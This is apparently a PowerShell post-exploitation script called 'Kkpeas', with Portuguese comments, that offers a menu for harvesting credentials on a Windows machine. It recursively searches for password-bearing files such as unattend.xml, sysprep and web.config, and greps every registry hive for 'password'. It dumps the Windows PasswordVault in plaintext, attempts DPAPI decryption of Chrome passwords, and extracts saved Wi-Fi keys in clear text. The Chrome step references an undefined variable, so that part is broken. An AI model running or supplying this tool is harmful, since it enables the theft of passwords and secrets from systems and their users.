function center_print {
   param (
       [string]$Text,
       [string]$PaddingCharacter = '*',
       [ConsoleColor]$ForegroundColor = 'Yellow'
   )

   $windowWidth = $host.UI.RawUI.WindowSize.Width
   $textLength = $Text.Length
   $totalPaddingCharacters = $windowWidth - $textLength
   $leftPaddingCharacters = $totalPaddingCharacters / 2
   $rightPaddingCharacters = $totalPaddingCharacters / 2

   # If the total padding characters are an odd number, add one more to the right
   if ($totalPaddingCharacters % 2 -ne 0) {
       $rightPaddingCharacters++
   }

   $leftPadding = $PaddingCharacter * $leftPaddingCharacters
   $rightPadding = $PaddingCharacter * $rightPaddingCharacters

   Write-Host "$leftPadding$Text$rightPadding" -ForegroundColor $ForegroundColor
}


function search_files_credentials () {
   center_print "Procurar pontos no sistema onde possa existir credenciais"
   # faz um filtro por diversos formatos de arquivos e nos mostra possiveis pontos no sistema onde possa existir credenciais, arquivos de maneira geral que possam conter senhas.
   gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
   #  Nesse caso especifico ele procura por arquivos Sysprep.ou Unattend, que sdo arquivos utilizados na configuragdo do sistema
   center_print "|-> Procurar por arquivos Sysprep.ou Unattend"
   gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
   
   center_print "Search credentials"
   cmd /c findstr /si password *.txt
   cmd /c findstr /si password *.xml
   cmd /c findstr /si password *.ini
   cmd /c dir /b /s unattend.xml
   cmd /c dir /b /s web.config
   cmd /c dir /b /s sysprep.inf
   cmd /c dir /b /s sysprep.xml
   cmd /c dir /b /s *pass*
   cmd /c dir /b /s vnc.ini
}

function search_registry_credentials (){
   center_print "Procurar pela string "password" no HKLM e HKCU"
   reg query HKLM /f password /t REG_SZ /s
   reg query HKCU /f password /t REG_SZ /s
   center_print "Procurar por credenciais no WinLogon"
   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

   center_print "|-> Procurando por Patterns dentro do Registro"
   $pattern = "password"
   $hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"

   center_print "|-> Procurar nas chaves do registro"
   foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }

   center_print "|-> Procuramos nos valores do registro"
   foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
   cmdkey /list
}

function search_vaults {

   center_print "Search in VAULT"
   [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

   center_print "GOOGLE CHROME"
   [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

   center_print "WIFI"
   (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

}

function Show-Menu {
    param (
        [string] $Title = 'My Menu'
    )
    Clear-Host
    center_print  "$Title"
    Write-Host "1: Press '1' to search_files_credentials"
    Write-Host "3: Press '2' to search_registry_credentials"
    Write-Host "4: Press '3' to search_vaults"
    Write-Host "q: Press 'q' to quit."
}

 $input = ''
 while ($input -ne 'q')
 {
     Show-Menu 'Kkpeas'
     $input = Read-Host "Please make a selection"
     switch ($input) {
         '1' {
            search_files_credentials
         }
         '2' {
            search_registry_credentials
         }
         '3' {
            search_vaults
         }
         'q' {
            return
         }
     }
     Read-Host "Press Enter to continue..."
}